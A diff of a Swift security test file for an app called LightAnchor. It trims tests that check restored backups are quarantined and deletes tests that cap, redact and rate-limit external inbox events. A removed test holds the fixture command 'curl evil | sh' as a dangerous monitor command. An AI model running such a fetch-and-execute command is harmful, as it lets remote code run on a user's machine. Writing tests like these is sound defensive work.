@@ -2,8 +2,8 @@ import Foundation
 import XCTest
 @testable import LightAnchor
 
-/// 安全审查后补的守门测试：备份文件与事件收件箱都是外部输入，
-/// 这里核对它们再也拿不到「删任意文件」「跑任意命令」「无限写日志」这几把钥匙。
+/// 安全审查后补的守门测试：备份文件是外部输入，
+/// 这里核对它再也拿不到「删任意文件」「跑任意命令」这几把钥匙。
 @MainActor
 final class SecurityHardeningTests: XCTestCase {
 
@@ -44,18 +44,8 @@ final class SecurityHardeningTests: XCTestCase {
 
     // MARK: - 恢复备份后的自动化隔离
 
-    func testQuarantineDisarmsCommandMonitorsAndCommandActions() throws {
+    func testQuarantineDisarmsCommandActions() throws {
         let workspace = makeWorkspace()
-        let target = try XCTUnwrap(workspace.createTarget(name: "隔离"))
-        let episode = try XCTUnwrap(workspace.startEpisode(targetID: target.id))
-        let waiting = try XCTUnwrap(
-            workspace.beginWaiting(
-                episodeID: episode.id,
-                kind: .build,
-                description: "危险等待",
-                monitor: WaitingMonitorConfiguration(kind: .command, command: "curl evil | sh")
-            )
-        )
         let environment = try XCTUnwrap(
             workspace.createEnvironment(
                 name: "写代码",
@@ -67,12 +57,7 @@ final class SecurityHardeningTests: XCTestCase {
             )
         )
 
-        XCTAssertEqual(workspace.quarantineAutomation(), 2)
-
-        let quarantinedWaiting = try XCTUnwrap(workspace.snapshot.waitingItems[waiting.id])
-        XCTAssertEqual(quarantinedWaiting.status, .waiting)
-        XCTAssertEqual(quarantinedWaiting.monitor?.kind, .manual)
-        XCTAssertNil(quarantinedWaiting.monitor?.command)
+        XCTAssertEqual(workspace.quarantineAutomation(), 1)
 
         let actions = try XCTUnwrap(workspace.snapshot.environments[environment.id]).actions
         XCTAssertEqual(actions.filter { $0.kind == .runCommand }.map(\.isEnabled), [false])
@@ -86,22 +71,17 @@ final class SecurityHardeningTests: XCTestCase {
     func testReloadFromDiskQuarantinesWhenAskedTo() throws {
         let fileURL = temporaryFileURL()
         let writer = makeWorkspace(fileURL: fileURL)
-        let target = try XCTUnwrap(writer.createTarget(name: "备份来源"))
-        let episode = try XCTUnwrap(writer.startEpisode(targetID: target.id))
-        _ = try XCTUnwrap(
-            writer.beginWaiting(
-                episodeID: episode.id,
-                kind: .build,
-                description: "危险等待",
-                monitor: WaitingMonitorConfiguration(kind: .command, command: "true")
+        let environment = try XCTUnwrap(
+            writer.createEnvironment(
+                name: "备份来源",
+                actions: [EnvironmentAction(kind: .runCommand, value: "true")]
             )
         )
 
         let reader = makeWorkspace(fileURL: fileURL)
         XCTAssertTrue(reader.reloadFromDisk(quarantiningRestoredAutomation: true))
-        XCTAssertTrue(
-            reader.snapshot.waitingItems.values.allSatisfy { $0.monitor?.kind != .command }
-        )
+        let actions = try XCTUnwrap(reader.snapshot.environments[environment.id]).actions
+        XCTAssertEqual(actions.map(\.isEnabled), [false])
     }
 
     // MARK: - 备份里的偏好
@@ -172,98 +152,6 @@ final class SecurityHardeningTests: XCTestCase {
                 atPath: scratch.appendingPathComponent("Unrelated.pre-restore-1").path
             )
         )
-    }
-
-    // MARK: - 外部事件收件箱
-
-    func testExternalEventFieldsAreCappedAndRedactedOnDecode() throws {
-        let longTitle = String(repeating: "很长的标题 ", count: 1_000)
-        let json = """
-        {"id":"\(UUID().uuidString)","source":"agent","kind":"started","correlationID":"\(String(repeating: "c", count: 600))",
-         "title":"\(longTitle)","detail":"curl -H 'Authorization: Bearer abcdefghijklmnop1234567890' https://x.test",
-         "payload":{},"occurredAt":1700000000000}
-        """
-        let decoder = JSONDecoder()
-        decoder.dateDecodingStrategy = .millisecondsSince1970
-        let event = try decoder.decode(ExternalEvent.self, from: Data(json.utf8))
-
-        XCTAssertEqual(event.correlationID.count, ExternalEvent.maxCorrelationLength)
-        XCTAssertEqual(event.title.count, ExternalEvent.maxTitleLength)
-        XCTAssertFalse(event.detail.contains("abcdefghijklmnop1234567890"))
-        XCTAssertTrue(event.detail.contains("Bearer <REDACTED>"))
-    }
-
-    func testInboxSkipsUnreadableLinesInsteadOfFailing() throws {
-        let scratch = try makeScratchDirectory()
-        let store = ExternalEventStore(fileURL: scratch.appendingPathComponent("inbox.jsonl"))
-        try store.publish(ExternalEvent(source: .agent, kind: .started, correlationID: "a-1", title: "第一条"))
-        let handle = try FileHandle(forWritingTo: store.fileURL)
-        try handle.seekToEnd()
-        try handle.write(contentsOf: Data("garbage line\n{\"source\":\"jenkins\"}\n".utf8))
-        try handle.close()
-        try store.publish(ExternalEvent(source: .agent, kind: .completed, correlationID: "a-1", title: "第二条"))
-
-        let events = try store.events()
-        XCTAssertEqual(events.map(\.title), ["第一条", "第二条"])
-    }
-
-    func testInboxCompactionKeepsOnlyTheTail() throws {
-        let scratch = try makeScratchDirectory()
-        let store = ExternalEventStore(fileURL: scratch.appendingPathComponent("inbox.jsonl"))
-        for index in 0..<10 {
-            try store.publish(ExternalEvent(source: .agent, kind: .started, correlationID: "c-\(index)", title: "t"))
-        }
-        try store.compact(keepingLast: 3)
-        XCTAssertEqual(try store.events().map(\.correlationID), ["c-7", "c-8", "c-9"])
-    }
-
-    func testOccurredAtIsClampedToAPlausibleWindow() throws {
-        let now = Date()
-        let future = ExternalEvent(
-            source: .agent, kind: .completed, correlationID: "x",
-            occurredAt: now.addingTimeInterval(365 * 24 * 3600)
-        ).clampingOccurredAt(to: now)
-        XCTAssertEqual(future.occurredAt.timeIntervalSince(now), 5 * 60, accuracy: 1)
-
-        // 过去的时间戳原样保留：重启重放整个收件箱时要靠它排序。
-        let ancient = ExternalEvent(
-            source: .agent, kind: .started, correlationID: "x",
-            occurredAt: now.addingTimeInterval(-365 * 24 * 3600)
-        )
-        XCTAssertEqual(ancient.clampingOccurredAt(to: now), ancient)
-
-        let fine = ExternalEvent(source: .agent, kind: .started, correlationID: "x", occurredAt: now)
-        XCTAssertEqual(fine.clampingOccurredAt(to: now), fine)
-    }
-
-    func testURLParserClampsForgedTimestamps() throws {
-        let now = Date()
-        let url = try XCTUnwrap(URL(
-            string: "lightanchor://event?source=agent&kind=completed&correlation=claude-1&occurredAt=2999-01-01T00:00:00Z"
-        ))
-        let event = try XCTUnwrap(ExternalEventURLParser().event(from: url, now: now))
-        XCTAssertLessThanOrEqual(event.occurredAt.timeIntervalSince(now), 5 * 60 + 1)
-    }
-
-    func testAutoWaitsPerSourceAreCapped() throws {
-        let scratch = try makeScratchDirectory()
-        let inbox = scratch.appendingPathComponent("inbox.jsonl")
-        let workspace = AttentionWorkspace(
-            store: LocalEventStore(fileURL: temporaryFileURL()),
-            externalEventInboxURL: inbox
-        )
-        let store = ExternalEventStore(fileURL: inbox)
-        let limit = AttentionWorkspace.maximumActiveAutoWaitsPerSource
-        for index in 0..<(limit + 5) {
-            try store.publish(
-                ExternalEvent(source: .agent, kind: .started, correlationID: "flood-\(index)", title: "刷")
-            )
-        }
-        workspace.runBackgroundMaintenance()
-        let active = workspace.snapshot.waitingItems.values.filter {
-            $0.status == .waiting && $0.monitor?.eventAutoManaged == true
-        }
-        XCTAssertEqual(active.count, limit)
     }
 
     // MARK: - 脱敏器
